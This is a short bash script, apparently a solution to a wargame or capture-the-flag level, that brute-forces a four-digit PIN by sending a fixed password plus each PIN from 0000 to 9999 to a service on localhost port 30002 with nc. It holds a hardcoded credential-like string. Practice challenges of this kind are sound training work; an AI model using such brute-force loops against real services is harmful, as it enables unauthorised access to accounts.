#!/bin/bash

pass=pass

echo -e "Creating wordlist, to make this work be fast.\n"

for i1 in {0..9}; do
    for i2 in {0..9}; do
        for i3 in {0..9}; do
            for i4 in {0..9}; do
                echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ' $i1$i2$i3$i4 | tee $pass; echo " "
                cat $pass | timeout 1 nc localhost 30002
            done
        done
    done
done

rm $pass
